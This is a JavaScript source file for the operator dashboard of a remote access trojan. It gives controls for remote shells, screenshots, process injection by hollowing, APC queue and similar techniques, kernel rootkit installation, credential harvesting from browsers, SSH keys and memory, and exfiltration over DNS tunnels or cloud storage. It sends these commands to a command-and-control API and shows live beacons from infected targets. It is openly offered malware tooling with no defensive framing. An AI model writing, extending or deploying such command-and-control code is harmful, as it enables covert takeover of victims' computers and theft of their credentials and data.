/**
 * Advanced RAT Controls Integration
 * Connects Phase 1-3 capabilities to dashboard UI
 */

class AdvancedRATControls {
    constructor() {
        this.selectedTarget = null;
        this.autoMode = true;
        this.activeOperations = new Map();
        this.init();
    }
    
    init() {
        this.injectUI();
        this.bindEvents();
        this.startTelemetry();
    }
    
    injectUI() {
        const dashboard = document.getElementById('dashboard');
        if (!dashboard) return;
        
        const advancedPanel = `
            <div id="advancedControls" class="advanced-panel">
                <div class="panel-header">
                    <h2>🎯 Advanced Operations</h2>
                    <label class="auto-mode">
                        <input type="checkbox" id="autoMode" checked>
                        <span>Autonomous Mode</span>
                    </label>
                </div>
                
                <!-- Phase 1 Controls -->
                <div class="control-section phase1">
                    <h3>📡 Basic Operations</h3>
                    <div class="control-grid">
                        <button class="control-btn" data-action="shell">
                            <i class="icon">💻</i>
                            <span>Shell</span>
                        </button>
                        <button class="control-btn" data-action="screenshot">
                            <i class="icon">📸</i>
                            <span>Screenshot</span>
                        </button>
                        <button class="control-btn" data-action="files">
                            <i class="icon">📁</i>
                            <span>Files</span>
                        </button>
                        <button class="control-btn" data-action="sysinfo">
                            <i class="icon">📊</i>
                            <span>Sysinfo</span>
                        </button>
                    </div>
                </div>
                
                <!-- Phase 2 Controls -->
                <div class="control-section phase2">
                    <h3>💉 Process Injection</h3>
                    <div class="injection-controls">
                        <select id="processSelect" class="control-select">
                            <option>Loading processes...</option>
                        </select>
                        <select id="techniqueSelect" class="control-select">
                            <option value="auto">Auto-Select</option>
                            <option value="remote_thread">CreateRemoteThread</option>
                            <option value="hollow">Process Hollowing</option>
                            <option value="apc">APC Queue</option>
                            <option value="manual_map">Manual Mapping</option>
                        </select>
                        <button class="control-btn primary" data-action="inject">
                            <i class="icon">💉</i>
                            <span>Inject</span>
                        </button>
                    </div>
                    <div class="injection-status" id="injectionStatus"></div>
                </div>
                
                <!-- Phase 3 Controls -->
                <div class="control-section phase3">
                    <h3>🛡️ Advanced Persistence</h3>
                    <div class="control-grid">
                        <button class="control-btn danger" data-action="rootkit">
                            <i class="icon">👹</i>
                            <span>Install Rootkit</span>
                            <span class="badge">KERNEL</span>
                        </button>
                        <button class="control-btn" data-action="ghost">
                            <i class="icon">👻</i>
                            <span>Ghost Process</span>
                        </button>
                        <button class="control-btn" data-action="persist-all">
                            <i class="icon">🔒</i>
                            <span>Full Persist</span>
                        </button>
                    </div>
                </div>
                
                <!-- Credential Harvesting -->
                <div class="control-section credentials">
                    <h3>🔑 Credential Harvesting</h3>
                    <div class="cred-options">
                        <label><input type="checkbox" value="browser" checked> Browsers</label>
                        <label><input type="checkbox" value="ssh" checked> SSH Keys</label>
                        <label><input type="checkbox" value="memory" checked> Memory</label>
                        <label><input type="checkbox" value="system" checked> System</label>
                    </div>
                    <button class="control-btn gold" data-action="harvest">
                        <i class="icon">🔐</i>
                        <span>Harvest All</span>
                    </button>
                    <div class="cred-count">
                        Credentials found: <span id="credCount">0</span>
                    </div>
                </div>
                
                <!-- Exfiltration -->
                <div class="control-section exfiltration">
                    <h3>📤 Data Exfiltration</h3>
                    <div class="exfil-options">
                        <select id="exfilMethod" class="control-select">
                            <option value="direct">Direct (Fast)</option>
                            <option value="dns">DNS Tunnel (Stealthy)</option>
                            <option value="http">HTTP(S)</option>
                            <option value="cloud">Cloud Storage</option>
                        </select>
                        <input type="text" id="exfilTarget" placeholder="File path or pattern">
                        <button class="control-btn" data-action="exfiltrate">
                            <i class="icon">🚀</i>
                            <span>Exfiltrate</span>
                        </button>
                    </div>
                </div>
                
                <!-- Status & Telemetry -->
                <div class="telemetry-section">
                    <h3>📊 Live Telemetry</h3>
                    <div id="telemetryData">
                        <div class="telemetry-item">
                            <span class="label">Status:</span>
                            <span class="value" id="targetStatus">Idle</span>
                        </div>
                        <div class="telemetry-item">
                            <span class="label">Last Beacon:</span>
                            <span class="value" id="lastBeacon">Never</span>
                        </div>
                        <div class="telemetry-item">
                            <span class="label">Auto Actions:</span>
                            <span class="value" id="autoActions">0</span>
                        </div>
                        <div class="telemetry-item">
                            <span class="label">Persistence:</span>
                            <span class="value" id="persistenceStatus">
                                <span class="indicator red">None</span>
                            </span>
                        </div>
                    </div>
                </div>
                
                <!-- Activity Log -->
                <div class="activity-log">
                    <h3>📜 Activity Log</h3>
                    <div id="activityLog" class="log-container"></div>
                </div>
            </div>
        `;
        
        // Add CSS
        this.injectStyles();
        
        // Insert panel
        const container = document.createElement('div');
        container.innerHTML = advancedPanel;
        dashboard.appendChild(container.firstElementChild);
    }
    
    injectStyles() {
        const styles = `
            <style>
                .advanced-panel {
                    max-width: 1200px;
                    margin: 20px auto;
                    padding: 20px;
                    background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%);
                    border-radius: 15px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
                }
                
                .panel-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 30px;
                    padding-bottom: 15px;
                    border-bottom: 2px solid #3a3a4e;
                }
                
                .panel-header h2 {
                    color: #fff;
                    margin: 0;
                    font-size: 28px;
                }
                
                .auto-mode {
                    display: flex;
                    align-items: center;
                    color: #fff;
                    cursor: pointer;
                }
                
                .auto-mode input {
                    margin-right: 10px;
                    width: 20px;
                    height: 20px;
                }
                
                .control-section {
                    margin-bottom: 30px;
                    padding: 20px;
                    background: rgba(255,255,255,0.05);
                    border-radius: 10px;
                }
                
                .control-section h3 {
                    color: #4fc3f7;
                    margin-bottom: 15px;
                    font-size: 18px;
                }
                
                .control-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
                    gap: 15px;
                }
                
                .control-btn {
                    padding: 15px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    border: none;
                    border-radius: 10px;
                    color: white;
                    cursor: pointer;
                    transition: all 0.3s;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    gap: 8px;
                    position: relative;
                }
                
                .control-btn:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
                }
                
                .control-btn.danger {
                    background: linear-gradient(135deg, #f93b3b 0%, #c91e1e 100%);
                }
                
                .control-btn.gold {
                    background: linear-gradient(135deg, #ffd700 0%, #ffb700 100%);
                }
                
                .control-btn.primary {
                    background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
                }
                
                .control-btn .icon {
                    font-size: 24px;
                }
                
                .control-btn .badge {
                    position: absolute;
                    top: 5px;
                    right: 5px;
                    background: #ff3b3b;
                    color: white;
                    padding: 2px 6px;
                    border-radius: 10px;
                    font-size: 10px;
                    font-weight: bold;
                }
                
                .control-select {
                    padding: 10px;
                    background: #2a2a3e;
                    border: 1px solid #4a4a5e;
                    border-radius: 5px;
                    color: white;
                    width: 100%;
                    margin-bottom: 10px;
                }
                
                .injection-controls {
                    display: grid;
                    grid-template-columns: 1fr 1fr auto;
                    gap: 10px;
                    align-items: center;
                }
                
                .cred-options, .exfil-options {
                    display: flex;
                    gap: 20px;
                    margin-bottom: 15px;
                    flex-wrap: wrap;
                }
                
                .cred-options label {
                    color: #fff;
                    display: flex;
                    align-items: center;
                    gap: 5px;
                }
                
                .cred-count {
                    margin-top: 15px;
                    padding: 10px;
                    background: rgba(255, 215, 0, 0.1);
                    border-radius: 5px;
                    color: #ffd700;
                    font-weight: bold;
                }
                
                .telemetry-section {
                    background: rgba(0, 150, 200, 0.1);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
                
                .telemetry-item {
                    display: flex;
                    justify-content: space-between;
                    padding: 8px 0;
                    color: #fff;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                }
                
                .indicator {
                    padding: 2px 8px;
                    border-radius: 10px;
                    font-size: 12px;
                    font-weight: bold;
                }
                
                .indicator.green { background: #4caf50; }
                .indicator.yellow { background: #ffeb3b; color: #000; }
                .indicator.red { background: #f44336; }
                
                .activity-log {
                    background: rgba(0,0,0,0.3);
                    padding: 15px;
                    border-radius: 10px;
                    max-height: 200px;
                    overflow-y: auto;
                }
                
                .log-container {
                    font-family: 'Courier New', monospace;
                    font-size: 12px;
                    color: #0f0;
                }
                
                .log-entry {
                    padding: 2px 0;
                    border-bottom: 1px solid rgba(0,255,0,0.1);
                }
                
                .log-entry.error { color: #f44336; }
                .log-entry.warning { color: #ffeb3b; }
                .log-entry.success { color: #4caf50; }
            </style>
        `;
        
        document.head.insertAdjacentHTML('beforeend', styles);
    }
    
    bindEvents() {
        // Control buttons
        document.querySelectorAll('.control-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const action = btn.dataset.action;
                this.executeAction(action);
            });
        });
        
        // Auto mode toggle
        const autoMode = document.getElementById('autoMode');
        if (autoMode) {
            autoMode.addEventListener('change', (e) => {
                this.autoMode = e.target.checked;
                this.log(`Autonomous mode: ${this.autoMode ? 'ENABLED' : 'DISABLED'}`, 'warning');
            });
        }
        
        // Target selection (from main dashboard)
        document.addEventListener('targetSelected', (e) => {
            this.selectedTarget = e.detail.targetId;
            this.updateTargetInfo();
        });
    }
    
    async executeAction(action) {
        if (!this.selectedTarget) {
            this.showNotification('No target selected', 'error');
            return;
        }
        
        this.log(`Executing: ${action} on target ${this.selectedTarget}`, 'info');
        
        const payload = {
            target_id: this.selectedTarget,
            action: action,
            timestamp: Date.now()
        };
        
        // Add action-specific parameters
        switch(action) {
            case 'inject':
                payload.process = document.getElementById('processSelect').value;
                payload.technique = document.getElementById('techniqueSelect').value;
                break;
                
            case 'harvest':
                payload.targets = Array.from(
                    document.querySelectorAll('.cred-options input:checked')
                ).map(cb => cb.value);
                break;
                
            case 'exfiltrate':
                payload.method = document.getElementById('exfilMethod').value;
                payload.target = document.getElementById('exfilTarget').value;
                break;
                
            case 'rootkit':
                if (!confirm('Install kernel rootkit? This action is IRREVERSIBLE!')) {
                    return;
                }
                payload.confirm = true;
                break;
        }
        
        try {
            const response = await fetch(`/api/target/${this.selectedTarget}/action`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            const result = await response.json();
            
            if (result.success) {
                this.log(`✓ ${action} executed successfully`, 'success');
                this.trackOperation(result.task_id, action);
            } else {
                this.log(`✗ ${action} failed: ${result.error}`, 'error');
            }
            
        } catch (error) {
            this.log(`Network error: ${error}`, 'error');
        }
    }
    
    async updateTargetInfo() {
        if (!this.selectedTarget) return;
        
        try {
            // Get target details
            const response = await fetch(`/api/target/${this.selectedTarget}/info`);
            const data = await response.json();
            
            // Update status
            document.getElementById('targetStatus').textContent = data.status;
            document.getElementById('lastBeacon').textContent = data.last_beacon;
            
            // Update persistence status
            const persistEl = document.getElementById('persistenceStatus');
            if (data.has_rootkit) {
                persistEl.innerHTML = '<span class="indicator green">KERNEL</span>';
            } else if (data.has_persistence) {
                persistEl.innerHTML = '<span class="indicator yellow">USER</span>';
            } else {
                persistEl.innerHTML = '<span class="indicator red">NONE</span>';
            }
            
            // Update process list for injection
            if (data.processes) {
                const select = document.getElementById('processSelect');
                select.innerHTML = data.processes.map(p => 
                    `<option value="${p.pid}">${p.name} (${p.pid}) - Score: ${p.injection_score}</option>`
                ).join('');
            }
            
            // Update credential count
            if (data.credentials_found) {
                document.getElementById('credCount').textContent = data.credentials_found;
            }
            
        } catch (error) {
            console.error('Failed to update target info:', error);
        }
    }
    
    trackOperation(taskId, action) {
        this.activeOperations.set(taskId, {
            action: action,
            started: Date.now(),
            status: 'running'
        });
        
        // Poll for status
        const pollInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/task/${taskId}/status`);
                const data = await response.json();
                
                if (data.status === 'completed') {
                    this.log(`✓ Task ${taskId} completed`, 'success');
                    this.activeOperations.delete(taskId);
                    clearInterval(pollInterval);
                    
                    // Update UI based on action
                    if (action === 'harvest') {
                        document.getElementById('credCount').textContent = 
                            parseInt(document.getElementById('credCount').textContent) + data.credentials_found;
                    }
                } else if (data.status === 'failed') {
                    this.log(`✗ Task ${taskId} failed`, 'error');
                    this.activeOperations.delete(taskId);
                    clearInterval(pollInterval);
                }
            } catch (error) {
                console.error('Task poll error:', error);
            }
        }, 2000);
    }
    
    startTelemetry() {
        // WebSocket for real-time updates
        const socket = io();
        
        socket.on('target_update', (data) => {
            if (data.target_id === this.selectedTarget) {
                this.updateTargetInfo();
            }
            
            // Log autonomous actions
            if (data.auto_action && this.autoMode) {
                this.log(`[AUTO] ${data.auto_action}`, 'info');
                const autoCount = document.getElementById('autoActions');
                autoCount.textContent = parseInt(autoCount.textContent) + 1;
            }
        });
        
        socket.on('credential_found', (data) => {
            this.showNotification(`New credential: ${data.type} - ${data.username}`, 'success');
            document.getElementById('credCount').textContent = 
                parseInt(document.getElementById('credCount').textContent) + 1;
        });
        
        socket.on('persistence_installed', (data) => {
            this.showNotification(`Persistence installed: ${data.method}`, 'success');
            this.updateTargetInfo();
        });
    }
    
    log(message, type = 'info') {
        const logContainer = document.getElementById('activityLog');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logContainer.insertBefore(entry, logContainer.firstChild);
        
        // Keep only last 100 entries
        while (logContainer.children.length > 100) {
            logContainer.removeChild(logContainer.lastChild);
        }
    }
    
    showNotification(message, type = 'info') {
        // Create floating notification
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            background: ${type === 'error' ? '#f44336' : type === 'success' ? '#4caf50' : '#2196f3'};
            color: white;
            border-radius: 5px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.3);
            z-index: 10000;
            animation: slideIn 0.3s;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s';
            setTimeout(() => notification.remove(), 300);
        }, 5000);
    }
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.advancedControls = new AdvancedRATControls();
    });
} else {
    window.advancedControls = new AdvancedRATControls();
}